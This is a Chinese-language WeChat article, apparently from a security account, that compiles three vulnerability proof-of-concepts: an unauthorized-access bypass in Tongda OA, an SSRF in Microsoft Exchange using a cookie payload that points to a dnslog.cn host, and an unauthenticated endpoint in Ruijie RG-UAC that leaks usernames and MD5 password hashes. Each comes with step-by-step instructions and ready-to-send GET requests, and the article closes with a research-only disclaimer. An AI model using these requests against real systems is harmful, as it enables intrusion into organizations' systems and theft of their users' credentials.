> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw)

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcctBaUxlsUIcqeYicyu6icZUGxmopnOczia5txYAuM9sWF8gAF5AyEkErA/640?wx_fmt=gif)

1

通达 OA 未授权访问

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞类型:

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

**未授权访问**

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞利用条件:

  

**用户在线**

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞详情

1、先访问

http://xxx.xxx.xxx/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0

如果出现空白页面, 则说明已经获得权限.

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcnX3Vq1hz9Xn0kEesBlf5tQNES83jcZoaQMfcKsfOOQRiaIaMlOEJI5A/640?wx_fmt=png)

2、在访问 http://xxx.xxx.xxx/general/ , 成功进入系统

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXciaoibwic5GB9An41Q44iauQpUJKgaPK05REVulZueKlwibMjrayAdBgxnxg/640?wx_fmt=png)

3、如果出现 RELOGIN, 则说明目前没有人在线, 需要等待有人登录的时候在尝试

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcd2mWG8MCSxW4mBoQCIQAxQDGfibSpVkkecz2PzYiaOicgr59wajuiaicLTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞 POC:

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

```
GET http://xxx.xxx.xxx/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
GET http://xxx.xxx.xxx/general/
```

2

Exchange SSRF

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞类型:

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

**SSRF**

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞利用条件:

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

**无**

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞详情

1、寻找目标

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcxKrfW3NaIY95TCLiaHuOqonp8qia6ticibpHDjGEmRnnTaEzcJVoDncicQA/640?wx_fmt=png)

2、在 cookie 中插入 dnslog payload  

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcWicADl4QZZJiba9oNIv4mYcoiaVNJghLux7BcxMF0xgquPl7m6ichL92nA/640?wx_fmt=png)

3、DNSLOG 刷新, 证明 SSRF 存在

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXc9moOX3BgNf0icPxibAiaGgf4Lma27qej6MTLdKGibHZwaCPU5iaJLzSicQTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞 POC:

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

```
GET /owa/auth/x.js HTTP/1.1
Cookie:
X-AnonResource=true; X-AnonResource-Backend=woizqq.dnslog.cn/ecp/default.flt?~3; X-BEResource=woizqq.dnslog.cn/owa/auth/logon.aspx?~3;
```

3

锐捷 RG-UAC 信息泄漏

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞类型:

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

**未授权访问, 敏感信息泄露**

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞利用条件:

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

**无**

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞详情

1、直接访问锐捷 - UAC 的如下链接即可获得用户名和 MD5 加密密码

https://xxx.xxx.xxx/get_dkey.php

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcZY4D2h7o3ZxtEa5JonoPOicnUcTa5U25fofOUMzObhsmicsoFTcyYjMg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

漏洞 POC:

![](https://mmbiz.qpic.cn/mmbiz_gif/PDdTPicsmh4jRxaO6njKQpTmotU0RYdXcPr9hsbfJdRxB2KuzlU8ab0xlTZF2wCEhvT6Ctk8HGPS0ibriap8oXByA/640?wx_fmt=gif)

```
GET https://xxx.xxx.xxx/get_dkey.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/JGvzrR1zc4TE1OMlzTiau6mjXv62SiaK7dkWsS6HCshficjNbyAiclEcMfcGV4E7kSicQ7icEiawJYvXXbMyNKjKLwPjQ/640?wx_fmt=png)

END

**注：此文章只用于漏洞研究，切勿用于违法用途。因滥用产生的一切后果与本公众号无关。**

**参考文章:**

**https://mp.weixin.qq.com/s/LJRI04VViL4hbt6dbmGHAw**

**https://paper.seebug.org/1492/**

**https://twitter.com/zhzyker/status/1368572200194740232/photo/1**

****https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247483972&idx=1&sn=b51678c6206a533330b0279454335065****

扫码关注更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4iaxUx2M4LXBJhBNfzLmtxg1mCib9dkVB5y1C6qmicKolbLfGWxEicYWjP6VSUx296cUWj3dBrqtDfb6g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4iaxUx2M4LXBJhBNfzLmtxg1ibz8zRr774rnu7TERPQHpcV0icbu9fCs0mRjWZuicS2kmLXFHkCKYicpUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PDdTPicsmh4iaxUx2M4LXBJhBNfzLmtxg1gibj2XWCGAOvCNqttdEicsvUCVPj3NXzZuaXyXqSIVSTeGwKuGzhfLmw/640?wx_fmt=png)